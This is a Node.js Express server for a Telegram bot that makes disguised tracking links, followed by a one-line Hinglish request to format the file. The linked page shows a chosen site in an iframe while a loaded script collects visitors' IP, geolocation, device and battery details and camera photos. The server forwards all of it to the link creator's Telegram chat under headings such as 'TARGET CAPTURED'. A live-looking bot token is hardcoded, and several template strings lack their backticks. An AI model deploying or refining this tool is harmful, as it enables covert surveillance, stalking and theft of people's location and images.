import express from "express";
import fetch from "node-fetch";
import fs from "fs";
import path from "path";
import FormData from "form-data";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json({ limit: "50mb" }));
app.use(express.static("public"));

const BOT_TOKEN = "8975100574:AAGHgoUJQrQVQy7FCb1fpqhiZ-DHEUrwu6k";
const DB_FILE = "./database.json";

// ===== DB =====
function loadDB() {
if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, "{}");
return JSON.parse(fs.readFileSync(DB_FILE));
}

function saveDB(data) {
fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

function generateId() {
return Math.random().toString(36).substring(2, 8);
}

// ===== HOME =====
app.get("/", (req, res) => {
res.send("Server Running 🚀");
});

// ===== TRACK PAGE =====
app.get("/pro/:id", (req, res) => {
const trackingId = req.params.id;
const db = loadDB();
const entry = db[trackingId];

if (!entry) return res.send("Invalid Link");

res.send(`

<!DOCTYPE html>  <html>  
<head>  
<meta name="viewport" content="width=device-width, initial-scale=1.0">  
<style>  
html,body{margin:0;height:100%;overflow:hidden}  
iframe{width:100%;height:100%;border:none}  
</style>  
</head>  
<body>  <iframe src="${entry.targetUrl}"></iframe>  <script  
data-tracking-id="${trackingId}"  
data-server-url="https://zs-trace.onrender.com"  
src="/script.js"></script>  </body>  
</html>  
`);  
});  // ===== DATA =====
app.post("/data", async (req, res) => {
const trackingId = req.query.trackingId;
const data = req.body;

const db = loadDB();
const entry = db[trackingId];
if (!entry) return res.sendStatus(404);

const chatId = entry.owner;
const targetUrl = entry.targetUrl;

// ignore empty / duplicate calls
if (!data.IP_Address && !data.Device_Model) {
return res.sendStatus(200);
}

try {
const msg = `
📊 <b>VISITOR INFORMATION CAPTURED</b>
━━━━━━━━━━━━━━━━━━

🖥️ <b>Device & Browser</b>
• <b>Device:</b> ${data.Device_Model || "N/A"}
• <b>User Agent:</b>
<code>${data.User_Agent || "N/A"}</code>

🌐 <b>Network Information</b>
• <b>IP Address:</b> ${data.IP_Address || "N/A"}
• <b>Language:</b> ${data.Language || "N/A"}

📍 <b>Location Details</b>
• <b>Country:</b> ${data.Location?.Country || "N/A"}
• <b>Region:</b> ${data.Location?.Region || "N/A"}
• <b>City:</b> ${data.Location?.City || "N/A"}
• <b>Postal Code:</b> ${data.Location?.Postal_Code || "N/A"}
• <b>Timezone:</b> ${data.Timezone || "N/A"}

🗺 <b>Live Map</b>
${
data.Location?.Google_Maps
? <a href="${data.Location.Google_Maps}">📍 Open Location</a>
: "❌ Not Available"
}

🖼️ <b>Display Information</b>
• <b>Resolution:</b> ${data.Screen_Resolution || "N/A"}

🔋 <b>Battery Status</b>
• <b>Level:</b> ${data.Battery?.Level || "N/A"}
• <b>Charging:</b> ${data.Battery?.Charging || "N/A"}

🔐 <b>Device Permissions</b>
• <b>Camera:</b> ${data.Permissions?.Camera || "Unknown"}
• <b>Location:</b> ${data.Permissions?.Location || "Unknown"}

💾 <b>Hardware & Storage</b>
• <b>CPU Cores:</b> ${data.Hardware?.CPU_Cores || "N/A"}
• <b>RAM:</b> ${data.Hardware?.Device_Memory_GB || "N/A"} GB
• <b>Storage Used:</b> ${data.Storage?.Used || "0.00"} GB
• <b>Storage Total:</b> ${data.Storage?.Total || "0.00"} GB

━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b>
<code>${targetUrl}</code>
`;

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {  
  method: "POST",  
  headers: {  
    "Content-Type": "application/json"  
  },  
  body: JSON.stringify({  
    chat_id: chatId,  
    text: msg,  
    parse_mode: "HTML"  
  })  
});

} catch (e) {
console.log("DATA ERROR:", e);
}

res.sendStatus(200);
});

// ===== PHOTO =====
app.post("/photo", async (req, res) => {
const trackingId = req.query.trackingId;

const db = loadDB();
const entry = db[trackingId];
if (!entry) return res.sendStatus(404);

const chatId = entry.owner;
const targetUrl = entry.targetUrl;

try {
const { imageData } = req.body;
if (!imageData) return res.sendStatus(400);

const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");  

const filePath = path.join(__dirname, `photo_${Date.now()}.jpg`);  
fs.writeFileSync(filePath, base64Data, "base64");  

const formData = new FormData();  
formData.append("chat_id", chatId);  
formData.append("photo", fs.createReadStream(filePath));  

// 🔥 caption with target  
formData.append(  
  "caption",  
  `🎯 TARGET CAPTURED 📸\n\n🔗 ${targetUrl}`  
);  

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {  
  method: "POST",  
  body: formData  
});  

fs.unlinkSync(filePath);

} catch (err) {
console.log("PHOTO ERROR:", err);
}

res.sendStatus(200);
});

// ===== TELEGRAM =====
app.post(/bot${BOT_TOKEN}, async (req, res) => {
const msg = req.body.message;
if (!msg) return res.sendStatus(200);

const chatId = msg.chat.id;
const text = msg.text || "";

const db = loadDB();

if (text === "/start") {
await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({
chat_id: chatId,
text: "👋 Welcome!\n\nUse /create to generate tracking link"
})
});
}

else if (text === "/create") {
db[chatId] = { waiting: true };
saveDB(db);

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {  
  method: "POST",  
  headers: { "Content-Type": "application/json" },  
  body: JSON.stringify({  
    chat_id: chatId,  
    text: "Send target URL"  
  })  
});

}

else if (db[chatId]?.waiting) {
const id = generateId();

db[id] = {  
  owner: chatId,  
  targetUrl: text  
};  

db[chatId].waiting = false;  
saveDB(db);  

const link = `https://zs-trace.onrender.com/pro/${id}`;  

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {  
  method: "POST",  
  headers: { "Content-Type": "application/json" },  
  body: JSON.stringify({  
    chat_id: chatId,  
    text: `✅ Link Created:\n${link}`  
  })  
});

}

res.sendStatus(200);
});

// ===== START =====
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server Running 🚀"));

ye ke server.js isme format karke dena muje smj nHi aa raha kuchh